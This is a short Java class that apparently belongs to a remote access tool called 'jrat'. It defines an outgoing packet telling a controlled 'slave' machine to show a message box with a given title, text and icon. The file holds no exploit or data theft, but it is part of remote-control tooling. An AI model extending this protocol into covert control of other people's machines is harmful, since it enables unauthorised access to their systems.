package jrat.controller.packets.outgoing;

import jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet10Messagebox extends AbstractOutgoingPacket {

	private boolean laf;
	private int icon;
	private String title;
	private String message;

	public Packet10Messagebox(boolean laf, int icon, String title, String message) {
		this.laf = laf;
		this.icon = icon;
		this.title = title;
		this.message = message;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(laf);
		dos.writeInt(icon);
		slave.writeLine(title);
		slave.writeLine(message);
	}

	@Override
	public short getPacketId() {
		return 10;
	}

}
